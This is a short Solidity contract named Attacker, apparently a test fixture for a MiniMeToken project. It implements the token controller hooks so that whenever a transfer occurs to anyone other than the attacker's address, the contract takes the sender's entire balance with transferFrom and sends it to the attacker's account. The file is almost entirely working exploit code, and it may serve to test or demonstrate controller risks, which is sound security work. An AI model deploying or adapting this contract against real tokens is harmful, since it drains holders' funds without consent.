// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import { TokenController } from "../../contracts/TokenController.sol";
import { MiniMeToken } from "../../contracts/MiniMeToken.sol";

contract Attacker is TokenController {
    address public attackerEOA;

    constructor(address _attackerEOA) {
        attackerEOA = _attackerEOA;
    }

    function proxyPayment(address _owner) public payable override returns (bool) {
        return true;
    }

    function onTransfer(address _from, address _to, uint256 _amount) public override returns (bool) {
        if (_to != attackerEOA) {
            uint256 balance = MiniMeToken(payable(msg.sender)).balanceOfAt(_from, block.number);
            MiniMeToken(payable(msg.sender)).transferFrom(_from, attackerEOA, balance);
        }
        return true;
    }

    function onApprove(address _owner, address _spender, uint256 _amount) public pure override returns (bool) {
        return true;
    }
}
